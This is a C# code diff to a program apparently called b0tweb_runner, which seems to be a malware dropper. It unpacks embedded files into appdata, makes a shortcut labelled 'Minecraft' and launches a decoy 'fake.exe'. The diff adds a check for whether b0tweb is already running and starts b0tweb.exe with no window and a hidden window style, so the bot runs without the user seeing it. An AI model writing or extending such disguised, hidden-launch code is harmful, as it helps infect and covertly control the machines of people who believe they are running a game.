@@ -31,13 +31,36 @@ namespace b0tweb_runner
             string fileName = item.Remove(0, parts[0].Length + parts[1].Length + 2);
             Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(item);
 
-            FileStream fileStream = new FileStream(Path.Join(itemPath, fileName), FileMode.Create);
-            for (int i = 0; i < stream.Length; i++)
+            try
             {
-                fileStream.WriteByte((byte)stream.ReadByte());
+                FileStream fileStream = new FileStream(Path.Join(itemPath, fileName), FileMode.Create);
+                for (int i = 0; i < stream.Length; i++)
+                {
+                    fileStream.WriteByte((byte)stream.ReadByte());
+                }
+
+                fileStream.Close();
+            } catch(Exception e)
+            {
+                //Ignore
+            }
+        }
+
+        /// <summary>
+        /// Checks if the b0tweb process is already running.
+        /// </summary>
+        /// <returns>If b0tweb is already running.</returns>
+        public static bool IsRunning()
+        {
+            foreach (Process clsProcess in Process.GetProcesses())
+            {
+                if (clsProcess.ProcessName.ToLower().Contains("b0tweb"))
+                {
+                    return true;
+                }
             }
 
-            fileStream.Close();
+            return false;
         }
 
         /// <summary>
@@ -46,7 +69,6 @@ namespace b0tweb_runner
         /// <param name="path">The appdata folder path</param>
         private static void CreateSymbolicLink(string path)
         {
-
             IShellLink link = (IShellLink)new ShellLink();
             // setup shortcut information
             link.SetDescription("Minecraft");
@@ -70,7 +92,24 @@ namespace b0tweb_runner
 
             CreateSymbolicLink(path);
 
-            Process.Start(Path.Combine(path, "b0tweb.exe"));
+            if (!IsRunning())
+            {
+                ProcessStartInfo info = new ProcessStartInfo(Path.Combine(path, "b0tweb.exe"))
+                {
+                    RedirectStandardOutput = true,
+                    UseShellExecute = false,
+                    CreateNoWindow = true,
+                    WindowStyle = ProcessWindowStyle.Hidden
+                };
+
+                Process process = new Process()
+                {
+                    StartInfo = info
+                };
+
+                process.Start();
+            }
+
             // Launch the "hidden" application
             Process.Start(Path.Combine(path, "faker", "fake.exe"));
         }
